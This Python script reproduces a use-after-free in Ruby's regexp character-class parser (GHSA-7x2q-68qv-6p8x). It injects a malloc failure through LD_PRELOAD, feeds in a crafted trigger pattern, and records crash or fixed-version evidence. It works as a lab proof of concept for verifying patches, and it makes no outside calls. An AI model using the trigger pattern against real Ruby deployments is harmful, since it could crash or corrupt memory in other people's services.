#!/usr/bin/env python3
"""Reproduce the small-pattern GHSA-7x2q-68qv-6p8x UAF under one failed realloc.

This is an in-process, LD_PRELOAD-conditioned reproduction, not a wire-only
exploit. A 34-byte UTF-8 ignorecase character-class pattern reaches the
vulnerable second && merge. The interposer arms after Ruby startup, starts
counting at the observed 456-byte Regexp setup allocation, and fails the first
40-byte realloc.
On affected Ruby 3.3.13/3.4.12/4.0.9 the error cleanup reuses and frees the
stale 16-byte BBuf before parse_char_class's error path reads it again. Fixed
3.4.13 returns RegexpError and stays alive.

Build the interposer first:
  gcc -shared -fPIC -O2 -Wall -Wextra -Werror \
    -o lab/preload/failmalloc.so lab/preload/failmalloc.c -ldl
"""

from __future__ import annotations

import argparse
import json
import os
from pathlib import Path
import resource
import subprocess

ROOT = Path(__file__).resolve().parents[2]
EV = ROOT / "lab/build/evidence"
RUBY12 = ROOT / "lab/build/plain/ruby-3.4.12-plain/bin/ruby"
RUBY13 = ROOT / "lab/build/plain/ruby-3.4.13-plain/bin/ruby"
PATTERN = "(?i:[[:^ascii:][^一]&&[^二]&&x])"
PATTERN_SAFE = "(?i:[a&&b])"

def limits() -> None:
    resource.setrlimit(resource.RLIMIT_CORE, (0, 0))
    resource.setrlimit(resource.RLIMIT_AS, (512 * 1024 * 1024, 512 * 1024 * 1024))


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--ruby", type=Path, default=RUBY12)
    controls = parser.add_mutually_exclusive_group()
    controls.add_argument("--fixed", action="store_true", help="select fixed 3.4.13 unless --ruby is given")
    controls.add_argument("--safe", action="store_true", help="use a safe affected-build pattern")
    parser.add_argument("--size", type=int, default=40)
    parser.add_argument("--count", type=int, default=1)
    parser.add_argument("--trigger", type=int, default=456)
    parser.add_argument("--repeat", type=int, default=1)
    parser.add_argument("--tag", default="regexp-failmalloc")
    args = parser.parse_args()

    ruby = args.ruby
    if args.fixed and args.ruby == RUBY12:
        ruby = RUBY13
    if not ruby.is_absolute():
        ruby = ROOT / ruby
    preload = ROOT / "lab/preload/failmalloc.so"
    if not ruby.is_file() or not preload.is_file():
        raise SystemExit(f"missing ruby={ruby} or preload={preload}")
    pattern = PATTERN_SAFE if args.safe else PATTERN
    code = (
        '$stdout.sync=true; puts "READY"; STDIN.gets; x="x"*32768; '
        f"begin; Regexp.new({pattern!r}); puts \"OK\"; "
        'rescue Exception=>e; puts "#{e.class}:#{e.message}"; end'
    )
    EV.mkdir(parents=True, exist_ok=True)
    all_ok = True
    for index in range(args.repeat):
        tag = args.tag if args.repeat == 1 else f"{args.tag}-{index}"
        arm = EV / f"{tag}.arm"
        arm.unlink(missing_ok=True)
        env = os.environ.copy()
        env.update(
            LD_PRELOAD=str(preload),
            FAILMALLOC_ARM=str(arm),
            FAILMALLOC_SIZE=str(args.size),
            FAILMALLOC_COUNT=str(args.count),
            FAILMALLOC_TRIGGER_SIZE=str(args.trigger),
        )
        proc = subprocess.Popen(
            [str(ruby), "--disable-gems", "-e", code],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            env=env,
            preexec_fn=limits,
        )
        ready = proc.stdout.readline().strip()
        timed_out = False
        if ready == b"READY":
            arm.touch()
            try:
                stdout, stderr = proc.communicate(b"\n", timeout=15)
            except subprocess.TimeoutExpired:
                proc.kill()
                stdout, stderr = proc.communicate()
                timed_out = True
        else:
            stdout, stderr = proc.communicate(timeout=5)
        out_text = stdout.decode(errors="replace")
        err_text = stderr.decode(errors="replace")
        (EV / f"{tag}.out").write_bytes(stdout)
        if args.safe:
            expected = not timed_out and proc.returncode == 0 and out_text.startswith("OK\n")
        elif args.fixed:
            expected = (
                not timed_out
                and proc.returncode == 0
                and out_text.startswith("RegexpError:failed to allocate memory:")
            )
        else:
            expected = (
                not timed_out
                and proc.returncode < 0
                and "bbuf_free" in err_text
                and ("regparse.c:5072" in err_text or "regparse.c:5074" in err_text)
            )
        result = {
            "tag": tag,
            "ruby": str(ruby.relative_to(ROOT)) if ruby.is_relative_to(ROOT) else str(ruby),
            "fixed_expected": args.fixed,
            "safe_expected": args.safe,
            "pattern": pattern,
            "fail_size": args.size,
            "fail_count": args.count,
            "trigger_size": args.trigger,
            "ready": ready.decode(errors="replace"),
            "returncode": proc.returncode,
            "timed_out": timed_out,
            "stdout": out_text[:500],
            "stderr_tail": err_text[-2_000:],
            "expected_observed": expected,
        }
        (EV / f"{tag}.json").write_text(json.dumps(result, indent=2) + "\n")
        print(json.dumps({key: value for key, value in result.items() if key != "stderr_tail"}))
        all_ok = all_ok and expected
    return 0 if all_ok else 1


if __name__ == "__main__":
    raise SystemExit(main())
